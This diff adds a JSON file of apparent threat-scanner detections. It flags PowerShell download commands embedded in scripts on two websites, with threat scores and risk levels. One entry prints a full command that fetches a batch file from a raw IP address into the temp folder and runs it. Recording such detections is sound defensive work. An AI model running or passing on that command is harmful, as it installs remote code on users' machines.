@@ -1,0 +1,39 @@
+[
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Download",
+    "value": {
+      "FullMatch": "Invoke-WebRequest -Uri 'http://95.164.53.214:5554/d.bat' -OutFile \\",
+      "URL": "http://95.164.53.214:5554/d.bat",
+      "Context": "Invoke-WebRequest -Uri 'http://95.164.53.214:5554/d.bat' -OutFile \\",
+      "HTAPath": null,
+      "IsPotentiallyDangerous": true,
+      "RiskLevel": "High Risk"
+    }
+  },
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Command",
+    "value": "powershell -c \"Invoke-WebRequest -Uri 'http://95.164.53.214:5554/d.bat' -OutFile \\\"%temp%\\d.bat\\\" -UseBasicParsing; Start-Process \\\"%temp%\\d.bat\\\"\"`;\r"
+  },
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Command",
+    "value": "Invoke-WebRequest"
+  },
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Command",
+    "value": "EMBEDDED_IN_JS: powershell -c "
+  },
+  {
+    "source_url": "https://southernsolarcell.com",
+    "threat_score": 554,
+    "category": "PowerShell Command",
+    "value": "cURL "
+  }
+]
